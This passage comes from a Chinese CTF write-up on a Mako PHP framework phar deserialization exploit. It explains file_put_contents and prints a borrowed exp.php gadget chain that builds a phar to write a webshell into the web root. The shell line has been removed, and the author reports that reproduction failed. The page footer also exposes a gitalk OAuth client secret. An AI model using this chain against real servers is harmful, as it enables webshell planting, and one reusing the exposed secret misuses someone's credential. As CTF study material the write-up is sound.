<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td><em>data</em></td>
<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定文件句柄的环境。<em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略</td>
</tr>
</tbody>
</table>
<p>参数 <em>data</em> 可以是数组（但不能是多维数组）。</p>
<p>自 PHP 5.1.0 起，<em>data</em> 参数也可以被指定为 stream 资源，stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。</p>
<p>对 <em>context</em> 参数的支持是 PHP 5.0.0 添加的。</p>
<hr>
<p>这里就可以利用将我们想写入的数据写进容器中，理论成立，实践开始，我这里就直接用maxzed的exp啦，将shell写在/var/www/mako/public下。</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//由于要存本地，这个先和谐一下</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="string">//签名自动计算</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>接下来就是常规获取shell了，但是我自己本地搭的docker传上去的phar.phar没反应，没法读取，没能复现成功。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Web/" rel="tag"># Web</a>
              <a href="/tags/Crypto/" rel="tag"># Crypto</a>
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
              <a href="/tags/Misc/" rel="tag"># Misc</a>
              <a href="/tags/Re/" rel="tag"># Re</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/09/Hello/" rel="prev" title="Hello">
                  <i class="fa fa-chevron-left"></i> Hello
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="next" title="CTF中zip文件的使用">
                  CTF中zip文件的使用 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">309k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:41</span>
  </span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

    </div>
  </footer>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
  <script src="/js/third-party/math/katex.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"TWe1v3# GitHub repo owner","repo":"TWe1v3-Blogcomment","client_id":"b1f12cb0fd210a7f001b# GitHub Application Client ID","client_secret":"80355aa1b174d1926079780262cdc80f1ca96516","admin_user":"TWe1v3","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"cefc3bb581c3625bcca0885ad523c299"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>


<script src="/live2d-widget/autoload.js"></script>
</body>
</html>
